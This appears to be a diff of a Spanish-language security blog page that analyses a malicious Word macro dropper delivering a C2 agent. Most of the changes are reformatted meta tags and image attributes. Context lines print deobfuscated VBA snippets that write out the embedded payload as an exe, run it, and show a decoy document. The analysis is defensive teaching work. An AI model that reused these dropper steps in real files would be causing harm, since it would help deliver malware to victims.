@@ -47,19 +47,20 @@
 <link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="003 - Analizando un agente de C2 - Parte 1: el Dropper"/>
-<meta name="twitter:description" content="En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta."/>
+<meta name="twitter:card" content="summary"><meta name="twitter:title" content="003 - Analizando un agente de C2 - Parte 1: el Dropper">
+<meta name="twitter:description" content="En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta.">
 
 
 
-<meta property="og:title" content="003 - Analizando un agente de C2 - Parte 1: el Dropper" />
-<meta property="og:description" content="En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-12-10T22:29:12-05:00" />
-<meta property="article:modified_time" content="2023-12-10T22:29:12-05:00" /><meta property="og:site_name" content="Threat Anatomy Blog" />
-
+<meta property="og:url" content="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">
+  <meta property="og:site_name" content="Threat Anatomy Blog">
+  <meta property="og:title" content="003 - Analizando un agente de C2 - Parte 1: el Dropper">
+  <meta property="og:description" content="En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta.">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-12-10T22:29:12-05:00">
+    <meta property="article:modified_time" content="2023-12-10T22:29:12-05:00">
 
 
 
@@ -245,7 +246,7 @@
 </tbody>
 </table>
 <p>Luego, iniciamos el análisis con <a href="https://github.com/decalage2/oletools/wiki/olevba"><em>olevba</em></a> utilizando el parámetro -a para ver el análisis que ofrece la herramienta:</p>
-<p><img src="/img/003-olevba-a.png" alt="alt text" title="OleVBA analysis"></p>
+<p><img alt="alt text" src="/img/003-olevba-a.png" title="OleVBA analysis"></p>
 <p>Vemos que <em>olevba</em> nos advierte que se ejecuta la función <strong>Document_Open</strong> automáticamente cuando se abre el archivo (comportamiento típico de macros maliciosas, que evitan requerir interacción del usuario); adicionalmente, vemos ciertas cadenas de texto que <em>olevba</em> considera sospechosas:</p>
 <table>
 <thead>
@@ -279,7 +280,7 @@
 </table>
 <p>En este caso, <a href="/es/posts/002-analyzing-a-malicious-macro">a diferencia del artículo anterior</a>, <em>olevba</em> no detecta posibles indicadores de compromiso (IOC).</p>
 <p>Seguimos con el análisis utilizando el parámetro -c para visualizar las macros:</p>
-<p><img src="/img/003-olevba-c.png" alt="alt text" title="OleVBA macros"></p>
+<p><img alt="alt text" src="/img/003-olevba-c.png" title="OleVBA macros"></p>
 <p>Al visualizar las macros, podemos evidenciar algunas técnicas que el atacante usó para dificultar el análisis y evadir defensas:</p>
 <ol>
 <li>No se utilizan nombres de funciones ni variables fáciles de entender, lo que dificulta el análisis manual.</li>
@@ -291,7 +292,7 @@
 <p>Dado que la función tiene varias filas, y es dificil de entender con nombres de variable poco amigables, la exportamos a un archivo para &ldquo;limpiarla&rdquo; un poco:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>olevba.exe -c .\e38c39e302de158d22e8d0ba9cd6cc9368817bc611418a5777d00b90a9341404.docm &gt; macros.vba
 </span></span></code></pre></div><p>Una vez exportada, identificamos que Document_Open() llama a la función &ldquo;weoqzisdi___lorfar()&rdquo;:</p>
-<p><img src="/img/003-documentOpen.png" alt="alt text" title="Document Open Function"></p>
+<p><img alt="alt text" src="/img/003-documentOpen.png" title="Document Open Function"></p>
 <p>Dado que no vemos que ninguna de las otras funciones contenga código, extraemos la función weoqzisdi___lorfar() para su análisis:</p>
 <pre tabindex="0"><code class="language-vba" data-lang="vba">Sub weoqzisdi___lorfar()
     
@@ -358,7 +359,7 @@
     
 End Sub
 </code></pre><p>Luego de eliminar las lineas extra, así como arreglar la identación, procedemos a renombrar las variables para hacerlas mas amigables:</p>
-<p><img src="/img/003-replace.png" alt="alt text" title="Replace names"></p>
+<p><img alt="alt text" src="/img/003-replace.png" title="Replace names"></p>
 <p>En este caso, tenemos suerte de que algunas de las variables mantienen su nombre original antes de concatenarse con otros caracteres, por lo que nos permite identificar fácilmente para qué son utilizadas. De no tener esa información, podemos deducir su función en base a cómo están siendo utilizadas.</p>
 <p>Luego de cambiar el nombre a las variables largas, podemos empezar a avanzar fila por fila analizando lo que parece estar haciendo:</p>
 <pre tabindex="0"><code class="language-vba" data-lang="vba">Sub weoqzisdi___lorfar()
@@ -478,7 +479,7 @@ End Sub
 </h2>
 <p>Antes de iniciar el análisis dinámico procedemos a abrir <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite"><em>Procmon</em> y <em>Process Explorer</em></a>, ya que sabemos que la macro interactúa con carpetas e inicia nuevos procesos.</p>
 <p>Al intentar abrir el editor de Visual Basic (antes de hacer click en &ldquo;Habilitar contenido&rdquo;), nos percatamos que tiene contraseña:</p>
-<p><img src="/img/003-password.png" alt="alt text" title="Password Protected Macro"></p>
+<p><img alt="alt text" src="/img/003-password.png" title="Password Protected Macro"></p>
 <p>Si bien el editor de Visual Basic no nos deja acceder al contenido sin tener la contraseña, ya pudimos visualizar las macros previamente por medio de <em>olevba</em>, lo que nos dice que Microsoft Office no almacena las macros cifradas en reposo, por lo que ponerles contraseña no es un control efectivo si lo que se busca es que no sean analizadas.</p>
 <p>En este caso tenemos dos opciones:</p>
 <ol>
@@ -487,7 +488,7 @@ End Sub
 </ol>
 <p>En esta ocasión opté por la segunda opción (el cómo escapa del alcance del presente artículo, pero una rápida búsqueda en internet debe bastar).</p>
 <p>Una vez se tiene la macro abierta, podemos usar la tecla F8 para avanzar instrucción por instrucción. Podemos usar la ventana &ldquo;Locales&rdquo; para ver la asignación de contenido en las variables conforme se van ejecutando las instrucciones:</p>
-<p><img src="/img/003-locals.png" alt="alt text" title="Use of locals"></p>
+<p><img alt="alt text" src="/img/003-locals.png" title="Use of locals"></p>
 <p>La primera operación de interés que esperamos es la creación de una carpeta llamada Wrdix+número en la ruta del usuario (en este caso C:\users\tmn)</p>
 <pre tabindex="0"><code class="language-vba" data-lang="vba">    mfolder = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Wrdix&#34; &amp; &#34;&#34; &amp; Second(Now) &amp; &#34;\&#34;
     
@@ -495,13 +496,13 @@ End Sub
         MkDir (mfolder)
     End If
 </code></pre><p>Podemos comprobar que efectivamente se creó el directorio tanto inspeccionado la carpeta como por medio de <em>Procmon</em>:</p>
-<p><img src="/img/003-folderCreated.png" alt="alt text" title="New folder"></p>
-<p><img src="/img/003-procmonfolder.png" alt="alt text" title="Folder creation in ProcMon"></p>
+<p><img alt="alt text" src="/img/003-folderCreated.png" title="New folder"></p>
+<p><img alt="alt text" src="/img/003-procmonfolder.png" title="Folder creation in ProcMon"></p>
 <p>La siguiente operación que esperamos es que se copie el documento a la carpeta creada, que se le asigne el nombre domcxs.zip y que sea extraido:</p>
 <pre tabindex="0"><code class="language-vba" data-lang="vba">    FSEDEO.CopyFile Application.ActiveDocument.FullName, mfolder &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;), True
     Name mfolder &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;) As mfolder &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)
     mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)).items
-</code></pre><p><img src="/img/003-extractfolder.png" alt="alt text" title="Document copied and extracted"></p>
+</code></pre><p><img alt="alt text" src="/img/003-extractfolder.png" title="Document copied and extracted"></p>
 <p>Luego, esperamos que se cambie el nombre del archivo word\embeddings\oleObject1.bin a &ldquo;vteijam hdgtra.zip&rdquo;, que se extraiga y se cambie el nombre del archivo extraido a &ldquo;vteijam hdgtra.exe&rdquo;</p>
 <pre tabindex="0"><code class="language-vba" data-lang="vba">    &#39;Se renombra el archivo mfolder\word\embeddings\oleObject1.bin a &#34;mfoldder\word\vteijam hdgtra.zip&#34;
     Name mfolder &amp; &#34;word\embeddings\oleObject1.bin&#34; As mfolder &amp; &#34;word\&#34; &amp; mfile &amp; Replace(&#34;.z_ip&#34;, &#34;_&#34;, &#34;&#34;)
@@ -511,12 +512,12 @@ End Sub
     
     &#39;Se renombra mfolder\filewedum.bin como mfolder\mfile.exe
     Name mfolder &amp; &#34;oleObject&#34; &amp; filewedum &amp; &#34;.bin&#34; As mfolder &amp; mfile &amp; Replace(&#34;.e_xe&#34;, &#34;_&#34;, &#34;&#34;)
-</code></pre><p><img src="/img/003-zip-exe.png" alt="alt text" title="New zip just arrived"></p>
+</code></pre><p><img alt="alt text" src="/img/003-zip-exe.png" title="New zip just arrived"></p>
 <p>Finalmente, se ejecuta el binario &ldquo;vteijam hdgtra.exe&rdquo;:</p>
-<p><img src="/img/003-execution.png" alt="alt text" title="Executing exe"></p>
+<p><img alt="alt text" src="/img/003-execution.png" title="Executing exe"></p>
 <p>Podemos validar la creación de un nuevo proceso en <em>Process Explorer</em> y <em>Procmon</em>:</p>
-<p><img src="/img/003-procExp.png" alt="alt text" title="ProcExp exe"></p>
-<p><img src="/img/003-procmonexe.png" alt="alt text" title="Procmon exe"></p>
+<p><img alt="alt text" src="/img/003-procExp.png" title="ProcExp exe"></p>
+<p><img alt="alt text" src="/img/003-procmonexe.png" title="Procmon exe"></p>
 <p>Si bien ya se inició el programa embebido en el documento de Word, queda una tarea pendiente al atacante para no levantar sospechas:</p>
 <pre tabindex="0"><code class="language-vba" data-lang="vba">    &#39;Se guarda el archivo mfolder\word\embeddings\oleObject3.bin como C:\users\usuario\Documents\nombreDocumentoMalicioso.docx
     Dim dokc_paeth As String
@@ -544,11 +545,11 @@ End Sub
      = &#34;&#34;, Format
      = wdOpenFormatAuto, XMLTransform
      = &#34;&#34;
-</code></pre><p><img src="/img/003-newword.png" alt="alt text" title="Creating decoy file"></p>
-<p><img src="/img/003-decoy.png" alt="alt text" title="Decoy file"></p>
+</code></pre><p><img alt="alt text" src="/img/003-newword.png" title="Creating decoy file"></p>
+<p><img alt="alt text" src="/img/003-decoy.png" title="Decoy file"></p>
 <p>Al crear y abrir el nuevo archivo, a la víctima se le muestra el documento de Word que espera.</p>
 <p>Finalmente, validamos en <em>Procmon</em> que la segunda etapa empezó a realizar acciones:</p>
-<p><img src="/img/003-agent.png" alt="alt text" title="C2 agent"></p>
+<p><img alt="alt text" src="/img/003-agent.png" title="C2 agent"></p>
 <p>El payload malicioso corresponde a un agente de C2, cuyo análisis exploraremos en la segunda parte del post.</p>
 <h2 id="5-conclusiones">
   5. Conclusiones
